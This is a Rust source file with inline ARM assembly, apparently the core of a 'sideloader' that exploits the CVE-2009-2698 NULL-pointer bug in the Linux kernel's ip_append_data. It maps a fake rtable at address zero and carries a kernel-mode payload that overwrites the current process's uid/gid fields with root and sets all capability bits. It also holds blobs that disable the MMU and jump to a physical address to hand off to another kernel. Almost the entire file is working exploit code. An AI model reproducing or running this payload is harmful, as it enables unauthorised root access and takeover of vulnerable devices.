//! Entry point and the kernel-mode payloads.
//!
//! The ELF has a `PT_LOAD` at virtual address 0 for the fake `struct rtable`
//! and the jump payload.  The same layout is used by the earlier C
//! implementation of the CVE-2009-2698 route; see `README.md`.

use core::arch::global_asm;

global_asm!(
    r#"
    .syntax unified
    .arm

    .section .text._start,"ax",%progbits
    .global _start
    .type _start,%function
_start:
    mov r0, sp
    bl  sideloader_main
1:  b   1b
    .size _start, .-_start

    /* The fake page mapped at virtual 0 by the ELF loader.  It holds the
       fake struct rtable (output at 0x74) and the uid/gid at 0x100/0x104. */
    .section .zero,"aw",%progbits
    .space 4096

    /* Kernel-mode payload called from ip_append_data() with rt == NULL.
       ARM 2.6.16: current_thread_info() is sp & ~(THREAD_SIZE-1), THREAD_SIZE
       is 8192, thread_info->task is at offset 12.  The task_struct has eight
       consecutive uid/gid words, then group_info, then cap_effective,
       cap_inheritable and cap_permitted. */
    .section .text.kernel_payload,"ax",%progbits
    .global kernel_payload
    .type kernel_payload,%function
kernel_payload:
    push    {{r4-r11, lr}}
    mov     r4, sp
    ldr     r5, =0x1fff
    bic     r4, r4, r5
    ldr     r4, [r4, #12]       @ current task_struct
    ldr     r5, =0x100
    ldr     r6, [r5]            @ uid
    ldr     r7, [r5, #4]        @ gid
    mov     r8, #0
1:
    add     r9, r4, r8
    ldr     r10, [r9]
    cmp     r10, r6
    bne     2f
    ldr     r10, [r9, #4]
    cmp     r10, r6
    bne     2f
    ldr     r10, [r9, #8]
    cmp     r10, r6
    bne     2f
    ldr     r10, [r9, #12]
    cmp     r10, r6
    bne     2f
    ldr     r10, [r9, #16]
    cmp     r10, r7
    bne     2f
    ldr     r10, [r9, #20]
    cmp     r10, r7
    bne     2f
    ldr     r10, [r9, #24]
    cmp     r10, r7
    bne     2f
    ldr     r10, [r9, #28]
    cmp     r10, r7
    bne     2f
    mov     r10, #0
    str     r10, [r9]
    str     r10, [r9, #4]
    str     r10, [r9, #8]
    str     r10, [r9, #12]
    str     r10, [r9, #16]
    str     r10, [r9, #20]
    str     r10, [r9, #24]
    str     r10, [r9, #28]
    mvn     r10, #0
    str     r10, [r9, #0x24]    @ cap_effective
    str     r10, [r9, #0x28]    @ cap_inheritable
    str     r10, [r9, #0x2c]    @ cap_permitted
    b       3f
2:
    add     r8, r8, #4
    cmp     r8, #0x1000
    blt     1b
3:
    mov     r0, #0
    pop     {{r4-r11, pc}}
    .size kernel_payload, .-kernel_payload
    .ltorg

    /* Kernel-mode jump payload copied to virtual 0x80.  It disables
       IRQ/FIQ, invalidates the I-cache and TLB, then jumps to the stub. */
    .section .text.jump_blob,"ax",%progbits
    .global jump_blob_start
    .global jump_blob_end
jump_blob_start:
    mrs     r1, cpsr
    orr     r1, r1, #0xc0
    msr     cpsr_c, r1
    mov     r0, #0
    mcr     p15, 0, r0, c7, c5, 0   @ invalidate I cache
    mcr     p15, 0, r0, c8, c7, 0   @ invalidate TLB
    ldr     pc, [pc, #0]
    nop
    .word   0xc3f80000
jump_blob_end:

    /* Handoff stub copied to physical 0xc3f80000.  Entered in SVC mode
       with the MMU on, identity-mapped, so clearing the MMU leaves the PC
       on the same physical instruction. */
    .section .text.stub_blob,"ax",%progbits
    .global stub_blob_start
    .global stub_blob_end
stub_blob_start:
    mrs     r3, cpsr
    orr     r3, r3, #0xc0
    msr     cpsr_c, r3
    mov     r0, #0
    mcr     p15, 0, r0, c7, c14, 0  @ clean and invalidate D cache
    mcr     p15, 0, r0, c7, c10, 4  @ drain write buffer
    mcr     p15, 0, r0, c7, c5, 0   @ invalidate I cache
    mcr     p15, 0, r0, c8, c7, 0   @ invalidate TLB
    mrc     p15, 0, r0, c1, c0, 0
    bic     r0, r0, #0x00000005     @ MMU off, D cache off
    bic     r0, r0, #0x00001000     @ I cache off
    mcr     p15, 0, r0, c1, c0, 0
    nop
    nop
    nop
    nop
    ldr     r0, =0
    ldr     r1, =851
    ldr     r2, =0xc3f00000
    ldr     pc, =0xc2000000
    .ltorg
stub_blob_end:
"#
);

extern "C" {
    fn kernel_payload();
    static jump_blob_start: u8;
    static jump_blob_end: u8;
    static stub_blob_start: u8;
    static stub_blob_end: u8;
}

/// Address of the kernel-mode payload that `ip_append_data()` calls.
pub(crate) fn kernel_payload_addr() -> u32 {
    kernel_payload as *const () as usize as u32
}

unsafe fn blob(start: *const u8, end: *const u8) -> &'static [u8] {
    let len = end as usize - start as usize;
    core::slice::from_raw_parts(start, len)
}

/// The payload copied to virtual address 0x80 for the second trigger.
pub(crate) fn jump_blob() -> &'static [u8] {
    unsafe { blob(&jump_blob_start, &jump_blob_end) }
}

/// The MMU-off handoff stub copied to physical address 0xc3f80000.
pub(crate) fn stub_blob() -> &'static [u8] {
    unsafe { blob(&stub_blob_start, &stub_blob_end) }
}
